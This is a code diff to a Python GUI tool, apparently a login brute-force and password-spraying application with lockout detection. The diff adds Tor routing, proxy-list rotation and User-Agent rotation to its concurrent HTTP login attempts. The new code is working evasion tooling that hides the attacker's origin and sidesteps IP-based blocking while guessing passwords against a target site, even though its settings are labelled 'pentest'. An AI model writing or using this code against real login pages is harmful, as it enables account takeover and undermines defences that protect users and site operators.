@@ -131,6 +131,16 @@ class PasswordListGeneratorApp:
         self.var_lockout_regex = tk.StringVar(value="account locked|too many attempts|temporarily blocked|captcha")
         self.var_lockout_cooldown_min = tk.DoubleVar(value=30.0)
         self.var_lockout_jitter = tk.BooleanVar(value=True)
+        # Proxy/User-Agent rotation
+        self.var_tor_mode = tk.BooleanVar(value=False)
+        self.var_tor_proxy = tk.StringVar(value="socks5h://127.0.0.1:9050")
+        self.var_proxy_list_file = tk.StringVar(value="")
+        self.loaded_proxies: list[str] = []
+        self.var_proxy_rotation = tk.StringVar(value="per_request")  # per_request | per_worker
+        self.var_user_agent_rotate = tk.BooleanVar(value=False)
+        self.var_user_agent_list_file = tk.StringVar(value="")
+        self.loaded_user_agents: list[str] = []
+        self.var_user_agent_rotation = tk.StringVar(value="per_request")  # per_request | per_worker
 
         # Build UI
         self._build_ui()
@@ -205,6 +215,18 @@ class PasswordListGeneratorApp:
         self._add_labeled_entry(target, "Lockout regex", self.var_lockout_regex, row=6, col=4)
         self._add_labeled_entry(target, "Lockout cooldown (min)", self.var_lockout_cooldown_min, row=6, col=6)
         ttk.Checkbutton(target, text="Jitter", variable=self.var_lockout_jitter).grid(row=6, column=8, sticky="w", padx=4, pady=4)
+        # Proxy & UA rotation
+        ttk.Checkbutton(target, text="Use Tor (SOCKS5)", variable=self.var_tor_mode).grid(row=7, column=0, sticky="w", padx=4, pady=4)
+        self._add_labeled_entry(target, "Tor proxy", self.var_tor_proxy, row=7, col=2)
+        self._add_labeled_entry(target, "Proxy list file", self.var_proxy_list_file, row=7, col=4)
+        ttk.Button(target, text="Browse…", command=self.on_browse_proxy_list_file).grid(row=7, column=6, sticky="w", padx=4, pady=4)
+        ttk.Label(target, text="Proxy rotation").grid(row=7, column=7, sticky="e", padx=4, pady=4)
+        ttk.Combobox(target, textvariable=self.var_proxy_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=7, column=8, sticky="w", padx=4, pady=4)
+        ttk.Checkbutton(target, text="Rotate User-Agent", variable=self.var_user_agent_rotate).grid(row=8, column=0, sticky="w", padx=4, pady=4)
+        self._add_labeled_entry(target, "UA list file", self.var_user_agent_list_file, row=8, col=2)
+        ttk.Button(target, text="Browse…", command=self.on_browse_user_agent_list_file).grid(row=8, column=4, sticky="w", padx=4, pady=4)
+        ttk.Label(target, text="UA rotation").grid(row=8, column=5, sticky="e", padx=4, pady=4)
+        ttk.Combobox(target, textvariable=self.var_user_agent_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=8, column=6, sticky="w", padx=4, pady=4)
         for i in range(0, 9):
             target.grid_columnconfigure(i, weight=1)
 
@@ -419,6 +441,16 @@ class PasswordListGeneratorApp:
                 if cooldown_min < min_cooldown:
                     cooldown_min = min_cooldown
                     self.ui_queue.put(("log", f"Cooldown increased to {cooldown_min} min to respect window policy ({attempts_per_window} attempts per {window_min} min)."))
+            # Proxy & UA rotation config
+            proxies_list = []
+            if self.var_proxy_list_file.get().strip():
+                proxies_list = self._parse_list_file(self.var_proxy_list_file.get().strip())
+            ua_list = []
+            if self.var_user_agent_rotate.get():
+                if self.var_user_agent_list_file.get().strip():
+                    ua_list = self._parse_list_file(self.var_user_agent_list_file.get().strip())
+                if not ua_list:
+                    ua_list = self._built_in_user_agents()
             pentest_args = {
                 "enabled": True,
                 "url": url,
@@ -450,6 +482,13 @@ class PasswordListGeneratorApp:
                 "lockout_regex": self._compile_regex(self.var_lockout_regex.get()),
                 "lockout_cooldown_sec": float(self.var_lockout_cooldown_min.get() or 30.0) * 60.0,
                 "lockout_jitter": bool(self.var_lockout_jitter.get()),
+                # rotation
+                "tor_mode": bool(self.var_tor_mode.get()),
+                "tor_proxy": self.var_tor_proxy.get().strip(),
+                "proxies_list": proxies_list,
+                "proxy_rotation": self.var_proxy_rotation.get(),
+                "user_agents": ua_list,
+                "ua_rotation": self.var_user_agent_rotation.get() if self.var_user_agent_rotate.get() else "none",
             }
 
         mode = self.var_mode.get()
@@ -578,6 +617,14 @@ class PasswordListGeneratorApp:
             "lockout_regex": self.var_lockout_regex.get(),
             "lockout_cooldown_min": self.var_lockout_cooldown_min.get(),
             "lockout_jitter": self.var_lockout_jitter.get(),
+            # Rotation
+            "tor_mode": self.var_tor_mode.get(),
+            "tor_proxy": self.var_tor_proxy.get(),
+            "proxy_list_file": self.var_proxy_list_file.get(),
+            "proxy_rotation": self.var_proxy_rotation.get(),
+            "user_agent_rotate": self.var_user_agent_rotate.get(),
+            "user_agent_list_file": self.var_user_agent_list_file.get(),
+            "user_agent_rotation": self.var_user_agent_rotation.get(),
         }
         path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Profile JSON", "*.json"), ("All files", "*.*")])
         if not path:
@@ -660,6 +707,18 @@ class PasswordListGeneratorApp:
         self.var_lockout_regex.set(profile.get("lockout_regex", "account locked|too many attempts|temporarily blocked|captcha"))
         self.var_lockout_cooldown_min.set(float(profile.get("lockout_cooldown_min", 30.0)))
         self.var_lockout_jitter.set(bool(profile.get("lockout_jitter", True)))
+        # rotation load
+        self.var_tor_mode.set(bool(profile.get("tor_mode", False)))
+        self.var_tor_proxy.set(profile.get("tor_proxy", "socks5h://127.0.0.1:9050"))
+        self.var_proxy_list_file.set(profile.get("proxy_list_file", ""))
+        if self.var_proxy_list_file.get():
+            self.loaded_proxies = self._parse_list_file(self.var_proxy_list_file.get())
+        self.var_proxy_rotation.set(profile.get("proxy_rotation", "per_request"))
+        self.var_user_agent_rotate.set(bool(profile.get("user_agent_rotate", False)))
+        self.var_user_agent_list_file.set(profile.get("user_agent_list_file", ""))
+        if self.var_user_agent_list_file.get():
+            self.loaded_user_agents = self._parse_list_file(self.var_user_agent_list_file.get())
+        self.var_user_agent_rotation.set(profile.get("user_agent_rotation", "per_request"))
 
         self._info("Profile loaded")
 
@@ -1055,7 +1114,7 @@ class PasswordListGeneratorApp:
                 result[k.strip()] = v.strip()
         return result
 
-    def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str):
+    def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str, call_headers: dict | None = None, call_proxies: dict | None = None):
         url = cfg['url']
         method = cfg['method']
         user_param = cfg['user_param']
@@ -1064,9 +1123,9 @@ class PasswordListGeneratorApp:
         data = {user_param: username, pass_param: password, **extra}
         try:
             if method == 'GET':
-                resp = sess.get(url, params=data, timeout=cfg['timeout'])
+                resp = sess.get(url, params=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
             else:
-                resp = sess.post(url, data=data, timeout=cfg['timeout'])
+                resp = sess.post(url, data=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
             return resp
         except Exception as exc:
             self.ui_queue.put(("log", f"Request error: {exc}"))
@@ -1192,6 +1251,55 @@ class PasswordListGeneratorApp:
             q = queue.Queue(maxsize=2000)
             stop_event = threading.Event()
             progress_lock = threading.Lock()
+            # rotation state
+            proxy_cycle_lock = threading.Lock()
+            ua_cycle_lock = threading.Lock()
+            proxy_index = [0]
+            ua_index = [0]
+
+            def build_proxies_dict(proxy_url: str | None):
+                if not proxy_url:
+                    return None
+                return {'http': proxy_url, 'https': proxy_url}
+
+            def next_proxy_url(for_worker: bool = False) -> str | None:
+                # Determine proxy for request/worker
+                if cfg.get('tor_mode'):
+                    return cfg.get('tor_proxy')
+                lst = cfg.get('proxies_list') or []
+                if not lst:
+                    # fallback to single proxies config
+                    p = cfg.get('proxies')
+                    if isinstance(p, dict):
+                        return p.get('http') or p.get('https')
+                    return None
+                if cfg.get('proxy_rotation') == 'per_worker' and for_worker:
+                    # Assign a stable proxy per worker by index
+                    with proxy_cycle_lock:
+                        url = lst[proxy_index[0] % len(lst)]
+                        proxy_index[0] += 1
+                        return url
+                # per request
+                with proxy_cycle_lock:
+                    url = lst[proxy_index[0] % len(lst)]
+                    proxy_index[0] += 1
+                    return url
+
+            def next_user_agent(for_worker: bool = False) -> str | None:
+                if (cfg.get('ua_rotation') or 'none') == 'none':
+                    return None
+                lst = cfg.get('user_agents') or []
+                if not lst:
+                    return None
+                if cfg.get('ua_rotation') == 'per_worker' and for_worker:
+                    with ua_cycle_lock:
+                        ua = lst[ua_index[0] % len(lst)]
+                        ua_index[0] += 1
+                        return ua
+                with ua_cycle_lock:
+                    ua = lst[ua_index[0] % len(lst)]
+                    ua_index[0] += 1
+                    return ua
 
             def producer():
                 try:
@@ -1217,6 +1325,16 @@ class PasswordListGeneratorApp:
                 nonlocal completed, found_msg
                 sess = requests.Session()
                 self._configure_session(sess, cfg)
+                # Per-worker assignments
+                per_worker_proxy = next_proxy_url(for_worker=True) if cfg.get('proxy_rotation') == 'per_worker' else None
+                if per_worker_proxy:
+                    try:
+                        sess.proxies.update(build_proxies_dict(per_worker_proxy) or {})
+                    except Exception:
+                        pass
+                per_worker_ua = next_user_agent(for_worker=True) if cfg.get('ua_rotation') == 'per_worker' else None
+                if per_worker_ua:
+                    sess.headers['User-Agent'] = per_worker_ua
                 try:
                     while not self.cancel_requested and not stop_event.is_set():
                         try:
@@ -1230,7 +1348,18 @@ class PasswordListGeneratorApp:
                             if self.cancel_requested or stop_event.is_set():
                                 break
                             limiter.acquire()
-                            resp = self._http_attempt(sess, cfg, user, pwd)
+                            # Per-request overrides
+                            call_headers = None
+                            call_proxies = None
+                            if cfg.get('ua_rotation') == 'per_request':
+                                ua = next_user_agent()
+                                if ua:
+                                    call_headers = dict(sess.headers)
+                                    call_headers['User-Agent'] = ua
+                            if cfg.get('proxy_rotation') == 'per_request' or cfg.get('tor_mode') or not sess.proxies:
+                                purl = next_proxy_url()
+                                call_proxies = build_proxies_dict(purl)
+                            resp = self._http_attempt(sess, cfg, user, pwd, call_headers=call_headers, call_proxies=call_proxies)
                             # Lockout detection
                             if self._is_lockout(resp, cfg):
                                 trigger_lockout_backoff()
@@ -1331,6 +1460,22 @@ class PasswordListGeneratorApp:
             return
         self.var_spray_passwords_file.set(path)
 
+    def on_browse_proxy_list_file(self) -> None:
+        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
+        if not path:
+            return
+        self.var_proxy_list_file.set(path)
+        self.loaded_proxies = self._parse_list_file(path)
+        self.ui_queue.put(("log", f"Loaded {len(self.loaded_proxies)} proxies"))
+
+    def on_browse_user_agent_list_file(self) -> None:
+        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
+        if not path:
+            return
+        self.var_user_agent_list_file.set(path)
+        self.loaded_user_agents = self._parse_list_file(path)
+        self.ui_queue.put(("log", f"Loaded {len(self.loaded_user_agents)} user-agents"))
+
     def on_use_target_domain(self) -> None:
         url = self.var_target_url.get().strip()
         if not url:
@@ -1349,6 +1494,15 @@ class PasswordListGeneratorApp:
             self.var_email_domain.set(domain)
         except Exception:
             pass
+
+    def _built_in_user_agents(self) -> list[str]:
+        return [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        ]
 
     def run(self) -> None:
         try:
